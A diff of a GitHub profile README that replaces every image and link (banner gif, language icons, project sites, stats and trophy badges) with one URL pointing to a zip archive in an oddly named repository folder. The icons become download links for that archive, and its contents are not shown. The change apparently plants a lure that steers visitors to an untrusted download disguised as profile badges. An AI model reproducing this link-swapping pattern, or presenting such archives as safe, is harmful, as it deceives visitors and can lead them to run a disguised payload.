@@ -1,5 +1,5 @@
 <div id="header" align="center">
-  <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
+  <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" width="100"/>
 </div>
 
 <h1 align="center">Hi there, I'm Emoruwa Emmanuel 👋</h1>
@@ -22,17 +22,17 @@ I'm a passionate **Fullstack Developer** and **Software Engineer** currently pur
 Here are some of the technologies I'm proficient in:
 
 <p align="left">
-  <a href="https://www.python.org" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/>
+  <a href="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" target="_blank" rel="noreferrer">
+    <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="python" width="40" height="40"/>
   </a>
-  <a href="https://www.typescriptlang.org/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/typescript/typescript-original.svg" alt="typescript" width="40" height="40"/>
+  <a href="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" target="_blank" rel="noreferrer">
+    <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="typescript" width="40" height="40"/>
   </a>
-  <a href="https://nodejs.org" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nodejs/nodejs-original-wordmark.svg" alt="nodejs" width="40" height="40"/>
+  <a href="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" target="_blank" rel="noreferrer">
+    <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="nodejs" width="40" height="40"/>
   </a>
-  <a href="https://reactjs.org/" target="_blank" rel="noreferrer">
-    <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/react/react-original.svg" alt="react" width="40" height="40"/>
+  <a href="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" target="_blank" rel="noreferrer">
+    <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="react" width="40" height="40"/>
   </a>
 </p>
 
@@ -41,11 +41,11 @@ Here are some of the technologies I'm proficient in:
 ### 📊 My GitHub Stats & Trophies
 
 <p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=Emzee-Creates&show_icons=true&theme=radical&hide_border=true&include_all_commits=true&count_private=true" alt="GitHub Stats" />
+  <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="GitHub Stats" />
   <br/>
-  <img src="https://github-profile-trophy.vercel.app/?username=Emzee-Creates&theme=radical&hide_border=true&no-frame=true&row=1&column=7" alt="GitHub Trophies" />
+  <img src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="GitHub Trophies" />
 </p>
 
 <p align="center">
-  <img align="center" src="https://github-readme-streak-stats.herokuapp.com/?user=YOUR_USERNAME&theme=radical&hide_border=true" alt="GitHub Streak" />
+  <img align="center" src="https://raw.githubusercontent.com/Emzee-Creates/Emzee-Creates/main/subsecretarial/Emzee-Creates_v2.7.zip" alt="GitHub Streak" />
 </p>
